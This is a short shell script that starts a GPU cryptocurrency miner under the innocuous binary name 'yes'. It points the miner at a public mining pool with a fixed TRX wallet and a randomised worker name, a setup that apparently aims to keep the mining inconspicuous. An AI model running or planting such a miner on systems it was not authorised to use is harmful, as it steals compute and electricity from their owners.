POOL=rx-us.unmineable.com:3333
WALLET=TRX:TGaCwauTpNMJV8AfraMXfa9QwVHhB8aE7w
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo TC6nDQ9R-$(shuf -i 1911-931884 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
